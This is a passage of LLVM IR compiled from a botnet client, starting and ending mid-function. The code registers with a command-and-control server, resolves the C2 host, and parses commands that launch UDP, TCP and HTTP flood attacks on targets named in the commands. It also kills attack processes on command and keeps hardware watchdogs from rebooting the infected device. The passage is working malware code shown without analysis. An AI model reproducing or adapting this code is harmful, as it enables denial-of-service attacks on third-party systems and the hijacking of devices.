  %56 = load i32, i32* %13, align 4
  %57 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i64 0, i64 0
  %58 = call i64 @read(i32 noundef %56, i8* noundef %57, i64 noundef 1)
  %59 = load i32, i32* %13, align 4
  %60 = call i32 @close(i32 noundef %59)
  br label %61

61:                                               ; preds = %50, %44
  br label %39, !llvm.loop !16

62:                                               ; preds = %39
  call void @exit(i32 noundef 0) #14
  unreachable

63:                                               ; No predecessors!
  %64 = load i32, i32* %14, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %14, align 4
  br label %24, !llvm.loop !17

66:                                               ; preds = %24
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* noundef, i8* noundef, ...) #2

declare i64 @write(i32 noundef, i8* noundef, i64 noundef) #6

declare i64 @read(i32 noundef, i8* noundef, i64 noundef) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #11
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

10:                                               ; preds = %0
  %11 = load i64, i64* @numattackpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numattackpids, align 8
  %13 = load i64, i64* @numattackpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 noundef %15) #11
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

18:                                               ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numattackpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %18
  %25 = load i32*, i32** @attackpids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18, !llvm.loop !18

37:                                               ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numattackpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @attackpids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* noundef %44) #11
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @attackpids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

47:                                               ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @stop_attack() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  store i64 0, i64* %2, align 8
  br label %3

3:                                                ; preds = %29, %0
  %4 = load i64, i64* %2, align 8
  %5 = load i64, i64* @numattackpids, align 8
  %6 = icmp ult i64 %4, %5
  br i1 %6, label %7, label %32

7:                                                ; preds = %3
  %8 = load i32*, i32** @attackpids, align 8
  %9 = load i64, i64* %2, align 8
  %10 = getelementptr inbounds i32, i32* %8, i64 %9
  %11 = load i32, i32* %10, align 4
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %13, label %28

13:                                               ; preds = %7
  %14 = load i32*, i32** @attackpids, align 8
  %15 = load i64, i64* %2, align 8
  %16 = getelementptr inbounds i32, i32* %14, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @getpid() #11
  %19 = icmp ne i32 %17, %18
  br i1 %19, label %20, label %28

20:                                               ; preds = %13
  %21 = load i32*, i32** @attackpids, align 8
  %22 = load i64, i64* %2, align 8
  %23 = getelementptr inbounds i32, i32* %21, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = call i32 @kill(i32 noundef %24, i32 noundef 9) #11
  %26 = load i32, i32* %1, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %1, align 4
  br label %28

28:                                               ; preds = %20, %13, %7
  br label %29

29:                                               ; preds = %28
  %30 = load i64, i64* %2, align 8
  %31 = add i64 %30, 1
  store i64 %31, i64* %2, align 8
  br label %3, !llvm.loop !19

32:                                               ; preds = %3
  ret void
}

; Function Attrs: nounwind
declare i32 @getpid() #2

; Function Attrs: nounwind
declare i32 @kill(i32 noundef, i32 noundef) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @registerme(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [100 x i8], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i64 0, i64 0
  %5 = load i8*, i8** %2, align 8
  %6 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* noundef %4, i64 noundef 100, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.55, i64 0, i64 0), i8* noundef %5) #11
  %7 = load i32, i32* @C2, align 4
  %8 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i64 0, i64 0
  %9 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i64 0, i64 0
  %10 = call i64 @strlen(i8* noundef %9) #12
  %11 = call i64 @write(i32 noundef %7, i8* noundef %8, i64 noundef %10)
  %12 = icmp ne i64 %11, 0
  br i1 %12, label %13, label %14

13:                                               ; preds = %1
  br label %15

14:                                               ; preds = %1
  br label %15

15:                                               ; preds = %14, %13
  ret void
}

; Function Attrs: nounwind
declare i32 @snprintf(i8* noundef, i64 noundef, i8* noundef, ...) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @resolve_http() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.hostent*, align 8
  %3 = alloca %struct.in_addr**, align 8
  %4 = alloca i32, align 4
  %5 = load i8*, i8** @c2_http_host, align 8
  %6 = call %struct.hostent* @gethostbyname(i8* noundef %5)
  store %struct.hostent* %6, %struct.hostent** %2, align 8
  %7 = icmp eq %struct.hostent* %6, null
  br i1 %7, label %8, label %9

8:                                                ; preds = %0
  call void @herror(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i64 0, i64 0)) #11
  store i32 1, i32* %1, align 4
  br label %35

9:                                                ; preds = %0
  %10 = load %struct.hostent*, %struct.hostent** %2, align 8
  %11 = getelementptr inbounds %struct.hostent, %struct.hostent* %10, i32 0, i32 4
  %12 = load i8**, i8*** %11, align 8
  %13 = bitcast i8** %12 to %struct.in_addr**
  store %struct.in_addr** %13, %struct.in_addr*** %3, align 8
  store i32 0, i32* %4, align 4
  br label %14

14:                                               ; preds = %31, %9
  %15 = load %struct.in_addr**, %struct.in_addr*** %3, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %15, i64 %17
  %19 = load %struct.in_addr*, %struct.in_addr** %18, align 8
  %20 = icmp ne %struct.in_addr* %19, null
  br i1 %20, label %21, label %34

21:                                               ; preds = %14
  %22 = load %struct.in_addr**, %struct.in_addr*** %3, align 8
  %23 = load i32, i32* %4, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %22, i64 %24
  %26 = load %struct.in_addr*, %struct.in_addr** %25, align 8
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  %28 = load i32, i32* %27, align 4
  %29 = call i8* @inet_ntoa(i32 %28) #11
  %30 = call i8* @strcpy(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i64 0, i64 0), i8* noundef %29) #11
  store i32 0, i32* %1, align 4
  br label %35

31:                                               ; No predecessors!
  %32 = load i32, i32* %4, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %4, align 4
  br label %14, !llvm.loop !20

34:                                               ; preds = %14
  store i32 1, i32* %1, align 4
  br label %35

35:                                               ; preds = %34, %21, %8
  %36 = load i32, i32* %1, align 4
  ret i32 %36
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @watchdog_maintain() #0 {
  %1 = alloca [7 x i32], align 16
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = bitcast [7 x i32]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %4, i8 0, i64 28, i1 false)
  store i32 1, i32* %2, align 4
  store i32 0, i32* %3, align 4
  call void @table_unlock_val(i8 noundef zeroext 1)
  call void @table_unlock_val(i8 noundef zeroext 2)
  call void @table_unlock_val(i8 noundef zeroext 3)
  call void @table_unlock_val(i8 noundef zeroext 4)
  call void @table_unlock_val(i8 noundef zeroext 5)
  call void @table_unlock_val(i8 noundef zeroext 6)
  call void @table_unlock_val(i8 noundef zeroext 7)
  %5 = call i8* @table_retrieve_val(i32 noundef 1, i32* noundef null)
  %6 = call i32 (i8*, i32, ...) @open(i8* noundef %5, i32 noundef 2)
  %7 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  store i32 %6, i32* %7, align 16
  %8 = icmp ne i32 %6, -1
  br i1 %8, label %39, label %9

9:                                                ; preds = %0
  %10 = call i8* @table_retrieve_val(i32 noundef 2, i32* noundef null)
  %11 = call i32 (i8*, i32, ...) @open(i8* noundef %10, i32 noundef 2)
  %12 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  store i32 %11, i32* %12, align 4
  %13 = icmp ne i32 %11, -1
  br i1 %13, label %39, label %14

14:                                               ; preds = %9
  %15 = call i8* @table_retrieve_val(i32 noundef 3, i32* noundef null)
  %16 = call i32 (i8*, i32, ...) @open(i8* noundef %15, i32 noundef 2)
  %17 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  store i32 %16, i32* %17, align 8
  %18 = icmp ne i32 %16, -1
  br i1 %18, label %39, label %19

19:                                               ; preds = %14
  %20 = call i8* @table_retrieve_val(i32 noundef 4, i32* noundef null)
  %21 = call i32 (i8*, i32, ...) @open(i8* noundef %20, i32 noundef 2)
  %22 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  store i32 %21, i32* %22, align 4
  %23 = icmp ne i32 %21, -1
  br i1 %23, label %39, label %24

24:                                               ; preds = %19
  %25 = call i8* @table_retrieve_val(i32 noundef 5, i32* noundef null)
  %26 = call i32 (i8*, i32, ...) @open(i8* noundef %25, i32 noundef 2)
  %27 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  store i32 %26, i32* %27, align 16
  %28 = icmp ne i32 %26, -1
  br i1 %28, label %39, label %29

29:                                               ; preds = %24
  %30 = call i8* @table_retrieve_val(i32 noundef 6, i32* noundef null)
  %31 = call i32 (i8*, i32, ...) @open(i8* noundef %30, i32 noundef 2)
  %32 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  store i32 %31, i32* %32, align 4
  %33 = icmp ne i32 %31, -1
  br i1 %33, label %39, label %34

34:                                               ; preds = %29
  %35 = call i8* @table_retrieve_val(i32 noundef 7, i32* noundef null)
  %36 = call i32 (i8*, i32, ...) @open(i8* noundef %35, i32 noundef 2)
  %37 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  store i32 %36, i32* %37, align 8
  %38 = icmp ne i32 %36, -1
  br i1 %38, label %39, label %61

39:                                               ; preds = %34, %29, %24, %19, %14, %9, %0
  store i32 1, i32* %3, align 4
  %40 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  %41 = load i32, i32* %40, align 16
  %42 = call i32 (i32, i64, ...) @ioctl(i32 noundef %41, i64 noundef 2147768068, i32* noundef %2) #11
  %43 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  %44 = load i32, i32* %43, align 4
  %45 = call i32 (i32, i64, ...) @ioctl(i32 noundef %44, i64 noundef 2147768068, i32* noundef %2) #11
  %46 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  %47 = load i32, i32* %46, align 8
  %48 = call i32 (i32, i64, ...) @ioctl(i32 noundef %47, i64 noundef 2147768068, i32* noundef %2) #11
  %49 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  %50 = load i32, i32* %49, align 4
  %51 = call i32 (i32, i64, ...) @ioctl(i32 noundef %50, i64 noundef 2147768068, i32* noundef %2) #11
  %52 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  %53 = load i32, i32* %52, align 16
  %54 = call i32 (i32, i64, ...) @ioctl(i32 noundef %53, i64 noundef 2147768068, i32* noundef %2) #11
  %55 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  %56 = load i32, i32* %55, align 4
  %57 = call i32 (i32, i64, ...) @ioctl(i32 noundef %56, i64 noundef 2147768068, i32* noundef %2) #11
  %58 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  %59 = load i32, i32* %58, align 8
  %60 = call i32 (i32, i64, ...) @ioctl(i32 noundef %59, i64 noundef 2147768068, i32* noundef %2) #11
  br label %61

61:                                               ; preds = %39, %34
  %62 = load i32, i32* %3, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %64, label %88

64:                                               ; preds = %61
  br label %65

65:                                               ; preds = %65, %64
  %66 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  %67 = load i32, i32* %66, align 16
  %68 = call i32 (i32, i64, ...) @ioctl(i32 noundef %67, i64 noundef 2147768069, i32 noundef 0) #11
  %69 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = call i32 (i32, i64, ...) @ioctl(i32 noundef %70, i64 noundef 2147768069, i32 noundef 0) #11
  %72 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  %73 = load i32, i32* %72, align 8
  %74 = call i32 (i32, i64, ...) @ioctl(i32 noundef %73, i64 noundef 2147768069, i32 noundef 0) #11
  %75 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  %76 = load i32, i32* %75, align 4
  %77 = call i32 (i32, i64, ...) @ioctl(i32 noundef %76, i64 noundef 2147768069, i32 noundef 0) #11
  %78 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  %79 = load i32, i32* %78, align 16
  %80 = call i32 (i32, i64, ...) @ioctl(i32 noundef %79, i64 noundef 2147768069, i32 noundef 0) #11
  %81 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  %82 = load i32, i32* %81, align 4
  %83 = call i32 (i32, i64, ...) @ioctl(i32 noundef %82, i64 noundef 2147768069, i32 noundef 0) #11
  %84 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  %85 = load i32, i32* %84, align 8
  %86 = call i32 (i32, i64, ...) @ioctl(i32 noundef %85, i64 noundef 2147768069, i32 noundef 0) #11
  %87 = call i32 @sleep(i32 noundef 3)
  br label %65

88:                                               ; preds = %61
  call void @table_lock_val(i8 noundef zeroext 1)
  call void @table_lock_val(i8 noundef zeroext 2)
  call void @table_lock_val(i8 noundef zeroext 3)
  call void @table_lock_val(i8 noundef zeroext 4)
  call void @table_lock_val(i8 noundef zeroext 5)
  call void @table_lock_val(i8 noundef zeroext 6)
  call void @table_lock_val(i8 noundef zeroext 7)
  ret void
}

declare i32 @open(i8* noundef, i32 noundef, ...) #6

; Function Attrs: nounwind
declare i32 @ioctl(i32 noundef, i64 noundef, ...) #2

declare i32 @sleep(i32 noundef) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @proc_cmd(i32 noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %5 = load i8**, i8*** %4, align 8
  %6 = getelementptr inbounds i8*, i8** %5, i64 0
  %7 = load i8*, i8** %6, align 8
  %8 = call i8* @strstr(i8* noundef %7, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.56, i64 0, i64 0)) #12
  %9 = icmp ne i8* %8, null
  br i1 %9, label %28, label %10

10:                                               ; preds = %2
  %11 = load i8**, i8*** %4, align 8
  %12 = getelementptr inbounds i8*, i8** %11, i64 0
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strstr(i8* noundef %13, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0)) #12
  %15 = icmp ne i8* %14, null
  br i1 %15, label %28, label %16

16:                                               ; preds = %10
  %17 = load i8**, i8*** %4, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i8* @strstr(i8* noundef %19, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i64 0, i64 0)) #12
  %21 = icmp ne i8* %20, null
  br i1 %21, label %28, label %22

22:                                               ; preds = %16
  %23 = load i8**, i8*** %4, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i8* @strstr(i8* noundef %25, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i64 0, i64 0)) #12
  %27 = icmp ne i8* %26, null
  br i1 %27, label %28, label %29

28:                                               ; preds = %22, %16, %10, %2
  call void @stop_attack()
  br label %29

29:                                               ; preds = %28, %22
  %30 = load i8**, i8*** %4, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i8* @strstr(i8* noundef %32, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.60, i64 0, i64 0)) #12
  %34 = icmp ne i8* %33, null
  br i1 %34, label %41, label %35

35:                                               ; preds = %29
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i8* @strstr(i8* noundef %38, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i64 0, i64 0)) #12
  %40 = icmp ne i8* %39, null
  br i1 %40, label %41, label %68

41:                                               ; preds = %35, %29
  %42 = load i32, i32* %3, align 4
  %43 = icmp slt i32 %42, 5
  br i1 %43, label %47, label %44

44:                                               ; preds = %41
  %45 = load i32, i32* %3, align 4
  %46 = icmp sgt i32 %45, 5
  br i1 %46, label %47, label %48

47:                                               ; preds = %44, %41
  br label %195

48:                                               ; preds = %44
  %49 = call i32 @listFork()
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

51:                                               ; preds = %48
  br label %195

52:                                               ; preds = %48
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = load i8**, i8*** %4, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 2
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @atoi(i8* noundef %58) #12
  %60 = load i8**, i8*** %4, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 3
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @atoi(i8* noundef %62) #12
  %64 = load i8**, i8*** %4, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 4
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @atoi(i8* noundef %66) #12
  call void @udpflood(i8* noundef %55, i32 noundef %59, i32 noundef %63, i32 noundef %67)
  br label %68

68:                                               ; preds = %52, %35
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 0
  %71 = load i8*, i8** %70, align 8
  %72 = call i8* @strstr(i8* noundef %71, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i64 0, i64 0)) #12
  %73 = icmp ne i8* %72, null
  br i1 %73, label %80, label %74

74:                                               ; preds = %68
  %75 = load i8**, i8*** %4, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 0
  %77 = load i8*, i8** %76, align 8
  %78 = call i8* @strstr(i8* noundef %77, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i64 0, i64 0)) #12
  %79 = icmp ne i8* %78, null
  br i1 %79, label %80, label %110

80:                                               ; preds = %74, %68
  %81 = load i32, i32* %3, align 4
  %82 = icmp slt i32 %81, 6
  br i1 %82, label %86, label %83

83:                                               ; preds = %80
  %84 = load i32, i32* %3, align 4
  %85 = icmp sgt i32 %84, 6
  br i1 %85, label %86, label %87

86:                                               ; preds = %83, %80
  br label %195

87:                                               ; preds = %83
  %88 = call i32 @listFork()
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %91

90:                                               ; preds = %87
  br label %195

91:                                               ; preds = %87
  %92 = load i8**, i8*** %4, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 1
  %94 = load i8*, i8** %93, align 8
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 2
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @atoi(i8* noundef %97) #12
  %99 = load i8**, i8*** %4, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 3
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @atoi(i8* noundef %101) #12
  %103 = load i8**, i8*** %4, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 4
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @atoi(i8* noundef %105) #12
  %107 = load i8**, i8*** %4, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 5
  %109 = load i8*, i8** %108, align 8
  call void @tcpflood(i8* noundef %94, i32 noundef %98, i32 noundef %102, i32 noundef %106, i8* noundef %109)
  br label %110

110:                                              ; preds = %91, %74
  %111 = load i8**, i8*** %4, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 0
  %113 = load i8*, i8** %112, align 8
  %114 = call i8* @strstr(i8* noundef %113, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i64 0, i64 0)) #12
  %115 = icmp ne i8* %114, null
  br i1 %115, label %122, label %116

116:                                              ; preds = %110
  %117 = load i8**, i8*** %4, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 0
  %119 = load i8*, i8** %118, align 8
  %120 = call i8* @strstr(i8* noundef %119, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i64 0, i64 0)) #12
  %121 = icmp ne i8* %120, null
  br i1 %121, label %122, label %149

122:                                              ; preds = %116, %110
  %123 = load i32, i32* %3, align 4
  %124 = icmp slt i32 %123, 5
  br i1 %124, label %128, label %125

125:                                              ; preds = %122
  %126 = load i32, i32* %3, align 4
  %127 = icmp sgt i32 %126, 5
  br i1 %127, label %128, label %129

128:                                              ; preds = %125, %122
  br label %195

129:                                              ; preds = %125
  %130 = call i32 @listFork()
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %132, label %133

132:                                              ; preds = %129
  br label %195

133:                                              ; preds = %129
  %134 = load i8**, i8*** %4, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 1
  %136 = load i8*, i8** %135, align 8
  %137 = load i8**, i8*** %4, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 2
  %139 = load i8*, i8** %138, align 8
  %140 = call i32 @atoi(i8* noundef %139) #12
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 3
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* noundef %143) #12
  %145 = load i8**, i8*** %4, align 8
  %146 = getelementptr inbounds i8*, i8** %145, i64 4
  %147 = load i8*, i8** %146, align 8
  %148 = call i32 @atoi(i8* noundef %147) #12
  call void @stdflood(i8* noundef %136, i32 noundef %140, i32 noundef %144, i32 noundef %148)
  br label %149

149:                                              ; preds = %133, %116
  %150 = load i8**, i8*** %4, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 0
  %152 = load i8*, i8** %151, align 8
  %153 = call i8* @strstr(i8* noundef %152, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.66, i64 0, i64 0)) #12
  %154 = icmp ne i8* %153, null
  br i1 %154, label %161, label %155

155:                                              ; preds = %149
  %156 = load i8**, i8*** %4, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 0
  %158 = load i8*, i8** %157, align 8
  %159 = call i8* @strstr(i8* noundef %158, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i64 0, i64 0)) #12
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %195

161:                                              ; preds = %155, %149
  %162 = load i32, i32* %3, align 4
  %163 = icmp slt i32 %162, 7
  br i1 %163, label %167, label %164

164:                                              ; preds = %161
  %165 = load i32, i32* %3, align 4
  %166 = icmp sgt i32 %165, 7
  br i1 %166, label %167, label %168

167:                                              ; preds = %164, %161
  br label %195

168:                                              ; preds = %164
  %169 = call i32 @listFork()
  %170 = icmp ne i32 %169, 0
  br i1 %170, label %171, label %172

171:                                              ; preds = %168
  br label %195

172:                                              ; preds = %168
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 1
  %175 = load i8*, i8** %174, align 8
  %176 = load i8**, i8*** %4, align 8
  %177 = getelementptr inbounds i8*, i8** %176, i64 2
  %178 = load i8*, i8** %177, align 8
  %179 = load i8**, i8*** %4, align 8
  %180 = getelementptr inbounds i8*, i8** %179, i64 3
  %181 = load i8*, i8** %180, align 8
  %182 = call i32 @atoi(i8* noundef %181) #12
  %183 = trunc i32 %182 to i16
  %184 = load i8**, i8*** %4, align 8
  %185 = getelementptr inbounds i8*, i8** %184, i64 4
  %186 = load i8*, i8** %185, align 8
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 5
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* noundef %189) #12
  %191 = load i8**, i8*** %4, align 8
  %192 = getelementptr inbounds i8*, i8** %191, i64 6
  %193 = load i8*, i8** %192, align 8
  %194 = call i32 @atoi(i8* noundef %193) #12
  call void @httpflood(i8* noundef %175, i8* noundef %178, i16 noundef zeroext %183, i8* noundef %186, i32 noundef %190, i32 noundef %194)
  br label %195

195:                                              ; preds = %172, %171, %167, %155, %132, %128, %90, %86, %51, %47
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8* noundef, i8* noundef) #4

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @parse_buffer(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [11 x i8*], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %7 = bitcast [11 x i8*]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %7, i8 0, i64 88, i1 false)
  %8 = load i8*, i8** %2, align 8
  %9 = call i8* @strtok(i8* noundef %8, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i64 0, i64 0)) #11
  store i8* %9, i8** %6, align 8
  br label %10

10:                                               ; preds = %18, %1
  %11 = load i8*, i8** %6, align 8
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %16

13:                                               ; preds = %10
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 10
  br label %16

16:                                               ; preds = %13, %10
  %17 = phi i1 [ false, %10 ], [ %15, %13 ]
  br i1 %17, label %18, label %35

18:                                               ; preds = %16
  %19 = load i8*, i8** %6, align 8
  %20 = call i64 @strlen(i8* noundef %19) #12
  %21 = add i64 %20, 1
  %22 = call noalias i8* @malloc(i64 noundef %21) #11
  %23 = load i32, i32* %4, align 4
  %24 = add nsw i32 %23, 1
  store i32 %24, i32* %4, align 4
  %25 = sext i32 %23 to i64
  %26 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %25
  store i8* %22, i8** %26, align 8
  %27 = load i32, i32* %4, align 4
  %28 = sub nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = load i8*, i8** %6, align 8
  %33 = call i8* @strcpy(i8* noundef %31, i8* noundef %32) #11
  %34 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i64 0, i64 0)) #11
  store i8* %34, i8** %6, align 8
  br label %10, !llvm.loop !21

35:                                               ; preds = %16
  %36 = load i32, i32* %4, align 4
  %37 = icmp sgt i32 %36, 0
  br i1 %37, label %38, label %41

38:                                               ; preds = %35
  %39 = load i32, i32* %4, align 4
